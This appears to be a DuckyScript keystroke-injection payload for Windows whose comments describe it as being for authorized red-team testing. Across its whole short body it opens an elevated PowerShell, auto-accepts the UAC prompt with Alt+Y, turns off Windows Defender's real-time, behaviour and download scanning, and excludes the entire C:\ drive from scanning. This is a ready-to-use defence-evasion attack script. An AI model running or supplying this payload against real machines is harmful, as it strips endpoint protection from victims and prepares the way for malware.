REM ============================================================
REM  Windows · Disable Windows Defender (Admin Required)
REM ============================================================
REM  Opens an elevated PowerShell (triggers UAC) and disables
REM  real-time monitoring. For authorized red-team engagements
REM  where you need to test detection gaps.
REM
REM  Note: requires the user to click Yes on the UAC prompt,
REM  or UAC to be pre-configured to auto-elevate.

DEFAULTDELAY 60

GUI r
DELAY 700
STRING powershell
CTRL SHIFT ENTER
DELAY 2000
REM UAC prompt — press Alt+Y to accept
ALT y
DELAY 1500
STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true
STRINGLN Add-MpPreference -ExclusionPath "C:\"
STRINGLN exit
